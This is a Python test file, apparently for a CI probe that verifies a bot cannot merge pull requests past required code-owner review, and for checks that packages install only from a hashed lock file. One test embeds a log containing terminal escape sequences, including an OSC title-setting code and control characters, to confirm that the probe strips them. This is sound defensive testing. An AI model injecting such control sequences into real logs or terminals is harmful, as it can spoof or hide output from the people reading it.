    (_run_log(H1=_target("H1", graphql="1 GraphQL: Resource not accessible by integration (mergePullRequest)")), None),
    (_run_log(W=_target("W", squash="1 " + _METHOD.replace("{m}", "squash"))), None),  # a rule, but not code owner
    (_run_log(N=_target("N", approve=None)), None),                                   # no bot approval line
    (_run_log(N=_target("N", approve="1 Resource not accessible by integration")), None),   # bot approval refused
    (_run_log(H1=_target("H1", merge="SKIP")), None),                                 # merge not tried
    (_run_log(W=_target("W", graphql="SKIP")), None),                                 # no GraphQL try
    (_run_log(H1=""), None),                                                          # H1 never tried
    (_ALL_REFUSED, "d" * 40),                                                         # commit_id moved
    (_SOURCE, None),                                                                  # no answers
], ids=["squash-other-reason", "squash-workflows-only", "graphql-other-reason", "squash-method-only",
        "no-approval", "approval-refused", "merge-not-tried", "no-graphql", "h1-missing", "review-moved", "no-results"])
def test_v1_probe_inconclusive(tmp_path, log, kept):
    """M1 v1-probe/pass-not-proving-u1: PASS needs, for W, N and H1, the bot approval posted, REST squash and GraphQL
    squash both refused naming code-owner review, and merge and rebase refused; anything else is INCONCLUSIVE."""
    r, made = _v1(tmp_path, log, kept=kept)
    assert r.returncode == 1 and "INCONCLUSIVE" in r.stdout and not _turned_off(made), r.stdout + r.stderr
    assert "PASS" not in r.stdout


def test_v1_prime_probe_pass_names_each_target(tmp_path):
    """T4.11.3, M1: merge and rebase may be refused for any reason (method refused); squash needs "code owner"
    (case-insensitive) on every target."""
    log = _run_log(N=_target("N", squash='1 {"message":"Waiting on CODE OWNER review"}', merge="1 " + _OWNER))
    r, made = _v1(tmp_path, log)
    assert r.returncode == 0 and "PASS (V1')" in r.stdout, r.stdout + r.stderr
    second = tmp_path / "second"
    second.mkdir()
    r2, _ = _v1(second, _run_log(N=_target("N", squash=_OTHER)))
    assert r2.returncode == 1 and "W:proven N:not-proven H1:proven" in r2.stdout, r2.stdout


def test_v1_probe_prints_the_runs_v1_error_lines(tmp_path):
    """v1-probe/node-read-under-e: a V1-ERROR line from the run reaches Brian's output; the step's own echo text,
    which the log also shows, is not mistaken for one."""
    log = (_SOURCE + 'probe\tTry\t2026-11-18T09:00:00Z if [ -z "$node" ]; then echo "V1-ERROR: could not read '
           'node_id"; exit 1; fi\n' + _target("W", graphql="SKIP") + _line("V1-ERROR: could not read node_id"))
    r, made = _v1(tmp_path, log)
    assert r.returncode == 1 and "INCONCLUSIVE" in r.stdout, r.stdout + r.stderr
    assert [ln for ln in r.stdout.splitlines() if "V1-ERROR" in ln] == ["V1-ERROR: could not read node_id"]
    ps1 = (ROOT / "scripts" / "v1-probe.ps1").read_text(encoding="utf-8")
    assert "if ($_ -match 'V1-ERROR: .*')" in ps1 and "foreach ($l in $errors) { Log $l }" in ps1


def test_v1_probe_strips_ansi_and_control_characters_from_the_run_log(tmp_path):
    """v1-probe/log-raw-to-console: colour codes and control characters in the run's log never reach the console or
    the results file, and the V1 lines are still found after stripping."""
    esc = "\x1b"
    log = (_SOURCE + _target("W", graphql="SKIP").replace("V1-RESULT", f"{esc}[36mV1-RESULT").replace("\n", "\r\n")
           + f"probe\tTry\t2026-11-18T09:00:02Z {esc}[31mV1-ERROR: could not{esc}]0;title\x07 read node_id{esc}[0m\x08\n")
    r, made = _v1(tmp_path, log)
    assert r.returncode == 1 and "INCONCLUSIVE" in r.stdout, r.stdout + r.stderr
    assert [ln for ln in r.stdout.splitlines() if "V1-ERROR" in ln] == ["V1-ERROR: could not]0;title read node_id"]
    assert len([ln for ln in r.stdout.splitlines() if ln.startswith("V1-RESULT ")]) == 3
    saved = next(tmp_path.glob("v1-probe-results-*.txt")).read_text()
    for text in (r.stdout, saved):
        assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f]", text), repr(text)
    ps1 = (ROOT / "scripts" / "v1-probe.ps1").read_text(encoding="utf-8")
    assert "-replace '[\\x00-\\x08\\x0B-\\x1F\\x7F]', ''" in ps1 and "-replace '\\x1b\\[" in ps1


def test_v1_probe_ansi_strip_keeps_the_text_after_an_erase_code(tmp_path):
    """v1-probe/log-raw-to-console: ESC[K right before a V1 line leaves the whole line (a sed bracket range that
    swallowed letters turned `V1-MERGED W squash` into `quash`), and a carriage return is dropped."""
    esc = "\x1b"
    log = (_SOURCE + _line("V1-APPROVE W exit=0 APPROVED") + _line("V1-RESULT W squash exit=0 {}")
           + f"probe\tTry\t2026-11-18T09:00:01Z {esc}[KV1-MERGED W squash\r\n")
    r, made = _v1(tmp_path, log)
    assert r.returncode == 2 and "FAIL (V1' false)" in r.stdout and _turned_off(made), r.stdout + r.stderr
    assert "V1-MERGED W squash" in r.stdout.splitlines() and "\r" not in r.stdout and esc not in r.stdout


def test_v1_probe_stops_before_changing_anything_when_main_cannot_be_read(tmp_path):
    r, made = _v1(tmp_path, _ALL_REFUSED, MAIN_BEFORE="EMPTY")
    assert r.returncode == 1 and "could not read main. Nothing was changed." in r.stdout
    assert not any("-X" in c for c in made)


def test_v1_probe_needs_a_bot_merged_data_pr_first(tmp_path):
    r, made = _v1(tmp_path, _SOURCE, data_prs="0")
    assert r.returncode == 1 and "Nothing was changed" in r.stdout
    assert not any("-X" in c for c in made)


# ------------------------------------------------------------------ deps/transitive-unpinned: the hashed lock
def _pep503(name: str) -> str:
    """PEP 503 normalised project name (deps/lock-name-normalise): runs of -, _ and . are one -, lower case."""
    return re.sub(r"[-_.]+", "-", name).lower()


def test_lock_names_are_pep503_normalised():
    assert _pep503("Jinja2") == "jinja2" and _pep503("zope.interface") == "zope-interface"
    assert _pep503("typing_extensions") == _pep503("Typing-Extensions") == _pep503("typing__extensions")


def _lock_pins() -> dict:
    """{name: (version, [hashes])} from requirements.lock (pip-compile --generate-hashes output)."""
    pins, name = {}, None
    for line in (ROOT / "requirements.lock").read_text(encoding="utf-8").splitlines():
        m = re.match(r"^([A-Za-z0-9_.-]+)==([^\s\\;]+)", line)
        if m:
            name = _pep503(m.group(1))
            pins[name] = (m.group(2), [])
        h = re.search(r"--hash=sha256:([0-9a-f]{64})", line)
        if h and name:
            pins[name][1].append(h.group(1))
    return pins


def test_the_update_job_installs_only_hashed_pins_from_the_lock():
    steps = {s.get("name"): s for s in WF["jobs"]["update"]["steps"]}
    run = steps["Install system tools and Python packages"]["run"]
    assert "python -m pip install --require-hashes -r requirements.lock" in run and "requirements.txt" not in run
    assert re.findall(r"pip install -[^\n]*", TEXT) == ["pip install --require-hashes -r requirements.lock"]
    pins = _lock_pins()
    assert pins and all(hashes for _, hashes in pins.values()), "every locked package carries its sha256"


def test_the_lock_matches_requirements_txt_and_the_runner_python():
    pins = _lock_pins()
    for line in (ROOT / "requirements.txt").read_text(encoding="utf-8").splitlines():
        line = line.split("#")[0].strip()
        if line:
            name, version = line.split("==")
            assert pins[_pep503(name)][0] == version, f"{name}: rerun pip-compile (requirements.lock)"
    py = {s["with"]["python-version"] for j in WF["jobs"].values() for s in j["steps"]
          if s.get("uses", "").startswith("actions/setup-python")}
    assert py == {"3.12"}                                                         # the Python the lock was compiled on
    head = (ROOT / "requirements.lock").read_text(encoding="utf-8")[:400]
    assert "pip-compile with Python 3.12" in head and "--generate-hashes" in head
